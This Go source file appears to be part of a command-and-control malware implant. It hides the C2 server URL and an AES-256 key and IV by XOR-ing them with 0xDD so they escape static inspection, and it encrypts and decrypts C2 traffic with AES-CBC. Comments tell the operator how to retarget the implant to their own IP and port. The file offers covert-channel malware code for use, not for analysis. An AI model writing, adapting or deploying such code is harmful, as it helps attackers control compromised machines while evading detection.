package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"errors"
)

// xorKey is the XOR byte used to obfuscate sensitive strings at rest in the binary.
const xorKey = 0xDD

// c2URLObf: XOR-obfuscated C2 URL (decoded at runtime by initSecrets).
// To retarget: XOR each byte of "http://YOUR_IP:PORT" with 0xDD and replace this array.
// Run scripts/encrypt_c2.py to generate new arrays for all three blobs.
var c2URLObf = []byte{
	0xB5, 0xA9, 0xA9, 0xAD, 0xE7, 0xF2, 0xF2, 0xEC, 0xED, 0xF3,
	0xED, 0xF3, 0xED, 0xF3, 0xEF, 0xED, 0xE5, 0xE7, 0xE4, 0xED,
	0xED, 0xED,
}

// aesKeyObf: XOR-obfuscated AES-256 key (32 bytes). Must match c2_aes_key in server/config.json.
var aesKeyObf = []byte{
	0xBE, 0xEE, 0xAD, 0xED, 0x8E, 0xEE, 0xBE, 0xAF, 0xEE, 0xA9,
	0x96, 0xEE, 0xA4, 0x9C, 0xBF, 0xBE, 0x99, 0xEE, 0xBB, 0x9A,
	0xB5, 0x94, 0x97, 0xB6, 0x91, 0xB0, 0x93, 0xB2, 0x8D, 0xAC,
	0x8F, 0xAE,
}

// aesIVObf: XOR-obfuscated AES-CBC IV (16 bytes). Must match c2_aes_iv in server/config.json.
var aesIVObf = []byte{
	0xB4, 0xAB, 0xEC, 0xEF, 0xEE, 0xE9, 0xE8, 0xEB, 0xEA, 0xE5,
	0xE4, 0xED, 0xBC, 0xBF, 0xBE, 0xB9,
}

func xorDecode(b []byte) []byte {
	out := make([]byte, len(b))
	for i, v := range b {
		out[i] = v ^ xorKey
	}
	return out
}

// initSecrets decodes the obfuscated C2 URL into C2URL at startup.
// AES key/IV are decoded on each encrypt/decrypt call.
func initSecrets() {
	C2URL = string(xorDecode(c2URLObf))
}

func aesEncrypt(plaintext []byte) (string, error) {
	key := xorDecode(aesKeyObf)
	iv := xorDecode(aesIVObf)

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	// PKCS7 pad
	padding := aes.BlockSize - len(plaintext)%aes.BlockSize
	padded := make([]byte, len(plaintext)+padding)
	copy(padded, plaintext)
	for i := len(plaintext); i < len(padded); i++ {
		padded[i] = byte(padding)
	}

	ciphertext := make([]byte, len(padded))
	cipher.NewCBCEncrypter(block, iv).CryptBlocks(ciphertext, padded)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func aesDecrypt(b64 string) ([]byte, error) {
	key := xorDecode(aesKeyObf)
	iv := xorDecode(aesIVObf)

	ciphertext, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return nil, err
	}
	if len(ciphertext) == 0 || len(ciphertext)%aes.BlockSize != 0 {
		return nil, errors.New("bad ciphertext length")
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	cipher.NewCBCDecrypter(block, iv).CryptBlocks(ciphertext, ciphertext)

	// Remove PKCS7 padding
	pad := int(ciphertext[len(ciphertext)-1])
	if pad == 0 || pad > aes.BlockSize {
		return nil, errors.New("invalid padding")
	}
	return ciphertext[:len(ciphertext)-pad], nil
}
